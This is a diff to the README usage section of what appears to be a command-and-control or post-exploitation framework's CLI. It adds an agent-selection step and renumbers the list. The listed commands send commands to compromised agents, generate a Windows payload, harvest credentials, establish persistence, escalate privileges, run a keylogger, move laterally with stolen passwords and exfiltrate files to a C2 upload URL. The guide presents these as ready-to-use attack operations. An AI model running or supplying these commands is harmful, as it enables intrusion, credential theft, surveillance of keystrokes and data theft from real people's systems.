@@ -96,47 +96,57 @@ python cli/cli.py move-laterally --target_ip TARGET_IP --username USERNAME --pas
     python cli/cli.py list-agents
     ```
 
-2. **Sending a command to a specific agent**:
+2.    #### Interact with a specific agent:
+```bash
+python cli/cli.py select-agent AGENT_ID
+```
+
+3.    #### Interact with a specific agent:
+```bash
+Get-ComputerInfo
+```
+
+4. **Sending a command to a specific agent**:
     ```bash
     python cli/cli.py send-command --agent_id 1234-5678-9101-1121 --command "whoami"
     ```
 
-3. **Generating a payload for Windows**:
+5. **Generating a payload for Windows**:
     ```bash
     python cli/cli.py generate-payload --platform windows
     ```
 
-4. **Harvesting credentials**:
+6. **Harvesting credentials**:
     ```bash
     python cli/cli.py harvest-credentials
     ```
 
-5. **Establishing persistence**:
+7. **Establishing persistence**:
     ```bash
     python cli/cli.py establish-persistence
     ```
 
-6. **Escalating privileges**:
+8. **Escalating privileges**:
     ```bash
     python cli/cli.py escalate-privileges
     ```
 
-7. **Gathering system information**:
+9. **Gathering system information**:
     ```bash
     python cli/cli.py gather-system-info
     ```
 
-8. **Exfiltrating data**:
+10. **Exfiltrating data**:
     ```bash
     python cli/cli.py exfiltrate-data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
     ```
 
-9. **Starting a keylogger**:
+11. **Starting a keylogger**:
     ```bash
     python cli/cli.py start-keylogger --log_file_path /path/to/log_file
     ```
 
-10. **Moving laterally**:
+12. **Moving laterally**:
     ```bash
     python cli/cli.py move-laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
     ```
